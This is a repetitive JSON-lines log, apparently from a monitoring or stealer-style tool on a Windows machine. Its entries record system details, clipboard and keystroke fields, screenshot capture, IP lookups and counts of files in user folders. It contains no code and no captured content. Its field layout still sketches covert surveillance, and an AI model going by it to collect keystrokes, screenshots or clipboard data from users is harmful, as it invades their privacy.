{"timestamp": "2025-06-14T07:30:13.699239+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bdac998285ff4519ddb9af91ee2958bb068437a2e9d88bc1537b30d99a89b5d6", "_raw_log_hash": "8ff02ed2d586f4496dcbf3d7b6038a1d7e86c2cf0dd2cef698270ffb8870742c"}
{"timestamp": "2025-06-14T07:30:27.230315+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ad598b2223089d30a56cb864e69405cf32db9a605b7552bf223ac109a70b3993", "_raw_log_hash": "5aa518085813403e3a2cc9587d50d2f9e6d2c5c48695fad401fe3668296862ff"}
{"timestamp": "2025-06-14T07:30:40.704759+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e701775aaba68f466888bfce912d6b51e64e722863daeea449709df5c2850ffa", "_raw_log_hash": "f0750649fabf55a9b44c1b89f472df4459cecec1f4dd9d556ec7996eb70dfaea"}
{"timestamp": "2025-06-14T07:30:54.251971+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "44e6a113c7c8fb78c7fc015e6c214da1b3e1e80d2ab442e1720adf8dc5aee71f", "_raw_log_hash": "376f3e1573e22db3023e079a3ea6608162554eb57a59b7d88ba0771a3398a976"}
{"timestamp": "2025-06-14T07:31:07.783256+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4fce6119eade6cc44e12e4a397a4d8de20cd49303936c344efb3d978e809fe85", "_raw_log_hash": "12fb2c69287276e5f5e9709f1a5c73391f4ffa759710624d2b8a6c373dc245a7"}
{"timestamp": "2025-06-14T07:31:21.271256+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1dd5149ac2b573ad66c990e4eaf3be88b36bc13dae8be27d9ac4f95f288f8a0f", "_raw_log_hash": "52f6a08d4b67d09aa6850a422b829fcb2fb4e0eab77917ff0e5693fc1f7d2c2f"}
{"timestamp": "2025-06-14T07:31:34.869462+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fdd35fbdff981ee83b57ff4bd72caa664f78cc27d7565e6bed28dbcd2847adce", "_raw_log_hash": "f6ddf626302ddbf04d2d77f35601769ff13ae6eefc58cc8e99cf0c820e3d8ae3"}
{"timestamp": "2025-06-14T07:31:48.413523+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dcf19176bcfaf4b1a6111a42d2ee2726a08c31e5eadf379a4db1190cb025fb0a", "_raw_log_hash": "d813e39547b2b8d3bf03b29ffd27d7a6e335ca4fec0f2b26b6dc0bda6c115b78"}
{"timestamp": "2025-06-14T07:32:01.871547+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8284473fa686c1dac34956fd0048f26a3a91ab05f87139daa43cc2ec4977bf14", "_raw_log_hash": "e11008cd5d8c8e9408e897433abff6c66533a94456468d417fcdc1c3a5c8cac4"}
{"timestamp": "2025-06-14T07:32:15.457379+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9622afef6a36268b9890e004c8c5265f75197fb62654d4431aee4eb91e946752", "_raw_log_hash": "bf7d05038de29ae5e51f707fc732b8b4d21ed027088e0e62f1d6f4b4e8921190"}
{"timestamp": "2025-06-14T07:32:29.227606+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "635e8c6c5f13f6c7faaf1e998227b7c1a06846ee3df1b1bda5472813720eb9c6", "_raw_log_hash": "73ca4004f09a39d08121e847ef4dc4164d97274f1ccb4e4990ee518773a7be9c"}
{"timestamp": "2025-06-14T07:32:42.700947+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "aaa178a875418acfcbf8a34f49a7551f72a5341d579e5ee253dd6ad94956d2bc", "_raw_log_hash": "e481b915d568971a7267303d95079eb74cae9c3913baa71d06214a09c332b028"}
{"timestamp": "2025-06-14T07:32:56.227592+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "799e273ea0b9ff37d6d89739b6e0b18e4d89b8edcbdd49efe0b9d47fdfd06e9d", "_raw_log_hash": "1c9c556a55507c0cba0f621ca0fddaa14c5d09ec71e7706a88045338688c3b02"}
{"timestamp": "2025-06-14T07:33:09.735052+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "08026112e9153fa25101ca1ecbf27a9a5dc3f1f4cb620fd6b5974842bb97c5ad", "_raw_log_hash": "8ff72e1b786c995e060aebc16fc2b228bdf340496ae90d0cdbbe5809664d77e5"}
{"timestamp": "2025-06-14T07:33:23.368403+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fd987d7b18ab4a4d48894d790b4c6f7467c4835f5799d0daf924c692d5a66310", "_raw_log_hash": "19ca95a090ff4eed9416886afb4432b00170e0a2ad40519d0fa481faa264c41b"}
{"timestamp": "2025-06-14T07:33:36.899737+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "85028b9a163d45cf5f579a004e271b9e4e40c8149e4054c98819ab2abd43b2e7", "_raw_log_hash": "a89b61814137f16e6d6befb6d9edb4f4811ac27281cb5fa1565e43a65e83640a"}
{"timestamp": "2025-06-14T07:33:50.420147+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1def5f8950044f71d9168cbde8ad4b112faa91401e0c436721ca541dc96d9fc0", "_raw_log_hash": "e511ca4a28f1912bdf75e9c0cb117ff20cb2e82365233d09e6685f2d7e371c66"}
{"timestamp": "2025-06-14T07:34:03.970634+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5321d1b2ffe25d6696261fddf4aa77c44991980a753b12e622a5a557b206ff4c", "_raw_log_hash": "1c9c60ff50b9c55c4e916ae7b8e5c5006c611faf06ba859e20cc47fb3fa9cdfd"}
{"timestamp": "2025-06-14T07:34:17.495219+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4e14279ae1481e081212380032c3080a618669acb9737812f003d6c0ad25d63f", "_raw_log_hash": "5d9cd110100a4b88115ec644034312352d149744a9d4cd0b2ba8b99eb6b99d4f"}
{"timestamp": "2025-06-14T07:34:31.083500+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f7700742c041096fbbbfc8cfeab6ebb95338a7c6a31a8d8bc98f39b0d76b497e", "_raw_log_hash": "812cbd3fa3b418ff0fde27c246079bf740b7e0cfa0866fa3a160a36d591f9a59"}
{"timestamp": "2025-06-14T07:34:44.923712+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c6c593f00d99faa70de8928177687aedf8e5c5d76bfd09db9269cd932d8485e3", "_raw_log_hash": "75c45f666f8488d80e0ebe0fbf0b48a00198ddf11bb7d4872cc5c250bfcf8b22"}
{"timestamp": "2025-06-14T07:34:58.449935+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3ed00774140139ebf44d9957d84b8f90ddca3fb13dff8cd0b8d7e12ab60f51c8", "_raw_log_hash": "3301b0698f839efb2ca898300690b4fd55ae6e963fbb2999d5e38f94194ac0cd"}
{"timestamp": "2025-06-14T07:35:11.975447+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dc11e04769c40daa0a9f347f1d0417ecbf364198a1f96f42596a624feec6ab60", "_raw_log_hash": "8f757a825c05c82f19722730d4e0ef43dad8b184f3f5f49e8325d0ac21715cc2"}
{"timestamp": "2025-06-14T07:35:25.505773+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a486046cb48ac9bedf3f18c5d84e9593394c28a61a4348e750de466e98039205", "_raw_log_hash": "abc45afc09bbd2adda1b329a1a684fd79634dc364d58e7fb0786256fbe61716d"}
{"timestamp": "2025-06-14T07:35:39.015672+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8a896afbdf2a49f4ce376d2268f4b6faa83d0b5ea280fd0d949ff982709b6eb0", "_raw_log_hash": "74cad15725c4247e15fbc2786a7e664f1fb0606f8a49ae81a7bb640e485a144e"}
{"timestamp": "2025-06-14T07:35:52.703574+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "755d0b16f231749ce9d5679b0ffb67e2cf426930e5cda73e671f2b64f4b58483", "_raw_log_hash": "2d1559e12b4bf7d6dc920d8741c6e7bb0cf3a7fe8482448b8b4c1aa2b1145268"}
